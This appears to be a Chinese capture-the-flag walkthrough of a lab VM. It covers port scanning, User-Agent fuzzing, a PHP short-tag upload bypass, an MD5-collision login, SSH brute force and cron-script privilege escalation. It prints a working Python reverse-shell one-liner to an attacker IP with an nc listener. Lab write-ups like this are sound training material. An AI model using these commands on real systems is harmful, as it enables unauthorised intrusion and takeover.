> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/9K02mYvXGN_DxOtW6xPubA)

## 加载开启镜像, 开整

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04sChFVTblUBlFsZ5gAHvtZCU3CliadOiam3EicU4QZY2xF24TmqAf32VbUg/640?wx_fmt=png)

查看本机的 IP 地址段，然后进行扫描发现主机

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04s6RpbXg6KuCYP8RFv6JZCxutJKJASf7u5FMYfvpAXW3wvZsuuYuVZFA/640?wx_fmt=png)

```
root@kali:~# nmap -p-  -A -O 192.168.195.134
```

扫描发现开放两个端口 22、80，访问 80 发现是个 demo，在网页中寻找信息

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04sB2Ls6BfLHn1Wqy7VVcs2sNyC2EtR2VkKiaMM4ict7lqTsUYnicxP9eib1Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04sVRFc7siag1jcljBia4bQ9ELnia1ibShBeytdn7ia04BwOv0VcY4q07bgMVg/640?wx_fmt=png)

查看源代码未发现有效的信息，查看爬虫文件

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04swQrPYtI96ibiaMrb2UnD2cSiaOLRO4icnCIQ6b3yIFu5LSezBQxrxv37LQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04sEXciavXC0nQEZS2NfxeVCRfZKP122NMKPavg6xOOpaTUsBXFgLlLwIg/640?wx_fmt=png)

先扫一波再说

使用工具 - dirsearch

```
https://github.com/maurosoria/dirsearch
```

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04sKsfH9EY4HbwgicHT9QtkAUsU3JAPlRaSicB6LPnxBabmViayvyaiclrgww/640?wx_fmt=png)

并没有什么有用的信息，发现 ua 会原封不动的展示在回显，想到之前出题人提示 rockyou，可能用字典爆破 ua 会有收获

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04swulTnibGrDiaHfCd9A8Dl5ykHTOCFL3JrCZcEAAF5z3CysxFY8wGU1uA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04sGFicYlCOvicuRzp8sIQIkU4XJ4XQmjibWQib3xqse6K6mOu0TzsMjricHFg/640?wx_fmt=png)

## 操作一：爆破

进入 /usr/share/wordlists/ 路径下 kali 自带的密码字典 rockyou.txt.gz

进行解压：

```
gzip -d rockyou.txt.gz
```

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04sdNfINvhzqE2g0KyzpMXTrJpl27Szr16RiauFT8dxr0scnpJj0Via7Y3w/640?wx_fmt=png)

只要 ua 里包括 cyberdog 就可以得到提示页面.

## 操作二：脑洞大开出奇迹

还有一种操作时发现网页隐藏了一个图片，打开后将标题输入 ua 就可得到提示！ 要我估计把头挠秃了也想不出来

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04sDuNI1xsjHzAvtwTgGG5xJcK0QibCibuxsa3NOshp1pwicVSOPXaQoUEIA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04sooyQc00E87MHvCIxyJ5oVgHs9BBEkZAb2dibr0shlPiaiania4RBDfEAWA/640?wx_fmt=png)

打开是个上传页面  

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04sV1vVYgeKPcYNZd1vwUI1dicJt5rUkdpum3OcsUMyx6ofOEmDrvsDr9Q/640?wx_fmt=png)

经过上传测试发现，可以上传任何文件，但是文件内容不能超过 8 个字符。

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04sy4iabzAuxob5bxJ46aCuicgibCSV6wLoZc0XsBC0bWBRQSBGNfs32BpaQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04sP7MiaXwS5owNNpH5vxMevDibKEmjWiaKoLJJNSaHexMibJSA5WXG6VrcXw/640?wx_fmt=png)

## 此时可以用到 php 代码格式的小技巧

**###** **1. php 代码格式**  

```
PHP代码有下列几种格式，在此推荐使用第一种格式。1、标准格式，以 <?php 开头，以 ?> 结束。例如：
<?php
echo"welcome!";
?>

2、短标签，以 <? 开头，以 ?> 结束。例如：
<?
print "Thisis a PHP example.";
?>
注：短标签的启用必须启用php.ini中的配置项short_open_tag。使用短标签输出一段文字的话，还可以使用下列简介方式：
<?="This is a PHP example."; ?>

3、脚本。例如：
<script language="php">
print "Thisis a PHP example.";
```

相当于

```
<?php echo "This is a PHP example."; ?>
```

### 2. php 执行运算符

链接：php 执行运算符

经过测试，可以执行命令，但是仅局限于 <=2 个字符的命令，如 ls、ps，发现下一步提示

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04sQVuempF3w9Zia2CSwUialWAhuVNl6OPCElaIibkq6unkUQ69PQHZREkjg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04suN9AUtC7GcMAagKK7nTBTFYS9O4j4xDTVZmQq2a7JKSyKMxxj75Lhw/640?wx_fmt=png)

发现新文件，访问测试

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04sE82te5B1kO8G3wzfbibZWrFDFXwcicm1TTYEyywmlH9XTpA1G2WwMqbg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04sSQXia9RcZkgNfia0PRfFDBU6BrcAibSBicJZcajmUvGme3ibavLttcvHkkg/640?wx_fmt=png)

扫描发现备份文件

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04s1TdOBprCe0Y2Mjr1urQaPiaRpbobrpfcDxSgjBHor1CytjYkEcThptQ/640?wx_fmt=png)

值必须相等

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04s0brqBrcvW7kehP7WC5fUKWsvJJ8ibpqHSSKff9AsKzibKBRJibV0aibGkA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04sToiaftOiawjGmMSKRl37VxGdicCJaGEHlunmkNPgb6vPP8fzicejHCaxZg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04stOadBQMDbicvWCF9nDY38kZ1CBPe6VibVW9KZlqnTaJX4Dib33dqFyG3g/640?wx_fmt=png)

有个 python 工具可以生成 N 个 MD5 相同的文件，但是此工具仅可以在 *unix 上进行运行。

```
https://github.com/thereal1024/python-md5-collision
```

```
git clone https://github.com/thereal1024/python-md5-collision.git
另外需要安装依赖才能正确运行，需要root权限和python2/3 程序
apt-get update
```

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04sNWfZrIAQIaAFAIicdytnZh5jY6rb4yBxSF6xibCj8qvOuhdPuBic4cI8w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04soHvic1ROKu7ia5pNU2gjpnEm6p3mRlc2ywPu2QGZ1zdcpFzddtPyUQpA/640?wx_fmt=png)

**### Curl 用法之 --data-urlencode**

```
5) --data-urlencode key=value

--data-urlencode参数等同于-d，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL
编码。
先对数据进行URL编码，再发送给HTTP服务器，即对表单中的字段值进行URL编码后再发送。为了兼容CGI，格式为“name+分隔符+content”，如下所示：

name=content，将content进行URL编码，然后提交给HTTP服务器
=content，同上，只是未给出引用的name content，同上，注意content中不能包含=和@符号
name@filename，从文件filename中读取数据（包括换行符），将读取的数据进行URL编码，然后提交给HTTP服务器
@filename，同上
```

```
root@kali:/home/tools/python-md5-collision#curl--data-urlencode 
username@out_test_000.txt--data-urlencodepassword@out_test_001.txt--data-urlencode code@out_test_002.txt--data-urlencode"remember=1&login=Login"
http://192.168.195.134/d5fa314e8577e3a7b8534a014b4dcb221de823ad/index.php-i 
-i参数打印出服务器回应的HTTP标头。
```

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04sqkav6B03q2MX8QfXIWfhDLU4GKIX7Dwy9Rc8gcOH3ZBYiblA6dMUtyg/640?wx_fmt=png)

返回的请求头中有 Session 值，需要修改 cookie 进入 admin.php ，第二天了 IP 变了

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04szMdqjLw6wABzUbobkfRyicN2eBsQfNIUI2f1gXCKpuPf2YAGcveWbIw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04s00fF4JzDhjBmuLbIqiawxTUpEkWVxdrPeicAic1zSjENrkIqyAP8s2Yvg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04s8dicOPlBibYFBRLsAP3zObBQoYyW090WWQYCgfAHTa173tHD1W0lWIgw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04siaicO59lmjeryHu7jpGByuj2ScEoKNRtG3HMIknCaCIzOicxJI5Nj3egQ/640?wx_fmt=png)

使用 python 进行反弹 shell 网站执行

```
python-c"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.195.128',8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04sD3MU7nwtwUgI4WIh69Z1cEXicYNBBiaOiaC3M0Z3QicNlLDsn6OmOlVaoA/640?wx_fmt=png)

攻击机执行：

```
nc -lvp 8888
```

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04sflHYWvO7mEVzE1NerKAF7BZMZj4sU0Xeibdh8dJicnRejQjODb6iaB8eA/640?wx_fmt=png)

Getshell 进行信息搜集。发现 /home/downfall 用户目录下存在 todo 文件，查看该目录的其他文件发现隐藏文件，但没有权限。可以对此用户进行爆破，然后查看文件

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04s9KsXSkvibKRhtxf4phHeNsK8wuuG4t3DZYWwELicc3jm5yUDZGsH5RWw/640?wx_fmt=png)

靶场提示里有线索，以 sec 开头创造字典，前期信息搜集其 ssh 端口为 22，进行爆破。  

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04suea2pZtZwA2T9TIDztGOou9b6ia2WBEws1jJZHFgXSxqMWMHg1vsQZQ/640?wx_fmt=png)

爆破成功得到密码 secretlyinlove 

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04sKbM4iaeR5f7X2Y5Gwq0g3JaPz1ddBgLMKoMP2YBsAmXJQyG3sJnalicg/640?wx_fmt=png)

登录进行信息搜集，得到提示需要取得 root 权限。

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04sJjfmc0plQrVfxRGnGNKzjTgs8xAOtEl3ic8RQCdbThwckBpUoJ3Zu3A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04sicVaQlzqs9M5xf7P4KOOibictn5XJSD2ShN45sa8PM8GKm78icsAOF5icRg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04snK7I3w4QNeibMV5KYacN0NjGXRibV2hPeicTKkwm3wQqYnbjI4ia90lk0A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04syq0WgtXribSlsM6zicNIAMKRBRUfU0miaQLeFSH7Gh2d5iamvraVbEoHJA/640?wx_fmt=png)

经过分析发现，文件 /lib/logs/homeless.py 所有者为 downfall，但是邮件里提到 root 用户会每隔一段时间运行此脚本。思路就是以 downfall 用户修改 /lib/logs/homeless.py 文件，饭后 root 用户会运行修改后的文件，以此反弹 shell 得到提升 root 权限。

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04s78dianC3VkQlCsMlrUzHQP0AiaIOwJLnl2Ww9eF4vCsZaNjjdJ2BUaUg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04sXTibGaHcicbuw06rDzBIC9p55djHDR3ScgVdtXX7pjxmUpRy50lIXh3A/640?wx_fmt=png)

GetShell ！

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIIdmyiaznM8SEnjdaSJRs04stzaBauQSCa4NxHicWdws1lOqXklF7Cw8evgpBdVFZjnlMkUrgNLBy8w/640?wx_fmt=png)